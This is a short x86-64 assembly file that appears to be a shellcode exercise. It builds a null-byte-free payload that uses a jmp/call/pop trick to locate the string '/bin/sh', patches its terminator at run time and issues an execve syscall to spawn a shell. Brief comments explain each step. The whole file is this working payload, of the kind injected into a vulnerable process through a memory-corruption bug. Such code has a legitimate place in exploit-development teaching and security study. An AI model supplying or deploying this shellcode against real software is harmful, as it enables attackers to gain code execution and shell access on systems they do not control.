.section .data
.section .text
.globl _start

_start:
    jmp put_addr_on_stack

prep_string:
    pop %rbx # %rbx now contains the address of "/bin/sh"
    xor %rax, %rax
    mov %al, 0x07(%rbx)  # N -> \0
    mov %rbx, 0x08(%rbx) # write addr to mem
    mov %rax, 0x10(%rbx) # write null to mem

# execve( "/bin/sh", NULL, NULL )
# compile a program calling execve statically, then check how execve works
# basically execve( $rdi, $rsi, $rdx )
call_execve:
    xor %rax, %rax
    mov $0x3b, %al # if we move to %rax directly we get null bytes
    xor %rdx, %rdx
    xor %rsi, %rsi
    mov %rbx, %rdi
    syscall

put_addr_on_stack:
    call prep_string # this call puts the addr of string on stack
    .string "/bin/shNAAAAAAAABBBBBBBB"
